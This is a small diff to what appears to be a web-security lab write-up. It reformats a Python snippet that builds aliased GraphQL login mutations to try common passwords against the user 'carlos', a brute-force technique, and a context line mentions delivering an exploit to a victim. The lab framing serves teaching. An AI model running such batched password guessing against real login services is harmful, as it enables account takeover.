@@ -581,16 +581,17 @@ passwords = "123456,password,12345678,qwerty".split(',')
 
 mutations = []
 for index, element in enumerate(passwords):
-    mutation = f"""
-    bruteforce{index}: login(input: {{ password: "{element}", username: "carlos" }}) {{
-        token
-        success
-    }}
-    """
+    mutation = (
+        f"bruteforce{index}: login(input: {{ password: \"{element}\", username: \"carlos\" }}) {{\n"
+        "    token\n"
+        "    success\n"
+        "}\n"
+    )
     mutations.append(mutation)
 
 query = "\n".join(mutations)
 print(query)
+
 ```
 
 
@@ -675,6 +676,7 @@ Store and deliver to victum and lab is solved
 
 
 ---
+
 
 
 
